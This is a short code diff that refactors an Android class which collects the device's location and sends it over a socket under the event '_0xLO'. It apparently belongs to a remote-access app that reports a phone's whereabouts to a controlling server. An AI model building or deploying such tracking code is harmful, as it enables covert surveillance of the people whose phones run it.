@@ -13,7 +13,6 @@ import com.remote.app.socket.IOSocket;
 import org.json.JSONException;
 import org.json.JSONObject;
 
-import static com.remote.app.ConnectionManager.context;
 import static android.content.Context.LOCATION_SERVICE;
 
 public class LocManager implements LocationListener {
@@ -38,11 +37,6 @@ public class LocManager implements LocationListener {
     // Declaring a Location Manager
     protected LocationManager locationManager;
 
-
-    public LocManager() {
-        this.mContext = null;
-    }
-
     public LocManager(Context context) {
         this.mContext = context;
         getLocation();
@@ -65,8 +59,8 @@ public class LocManager implements LocationListener {
             if (isGPSEnabled || isNetworkEnabled) {
 
                 this.canGetLocation = true;
-                if (context.getPackageManager().checkPermission(Manifest.permission.ACCESS_FINE_LOCATION, context.getPackageName()) == PackageManager.PERMISSION_GRANTED &&
-                        context.getPackageManager().checkPermission(Manifest.permission.ACCESS_COARSE_LOCATION, context.getPackageName()) == PackageManager.PERMISSION_GRANTED) {
+                if (mContext.getPackageManager().checkPermission(Manifest.permission.ACCESS_FINE_LOCATION, mContext.getPackageName()) == PackageManager.PERMISSION_GRANTED &&
+                        mContext.getPackageManager().checkPermission(Manifest.permission.ACCESS_COARSE_LOCATION, mContext.getPackageName()) == PackageManager.PERMISSION_GRANTED) {
                     // First get location from Network Provider
                     if (isNetworkEnabled) {
 
@@ -140,7 +134,7 @@ public class LocManager implements LocationListener {
             accuracy = location.getAccuracy();
             speed = location.getSpeed();
         }
-        IOSocket.getInstance().getIoSocket().send("_0xLO", getData());
+        IOSocket.getInstance().send("_0xLO", getData().toString());
     }
 
     @Override
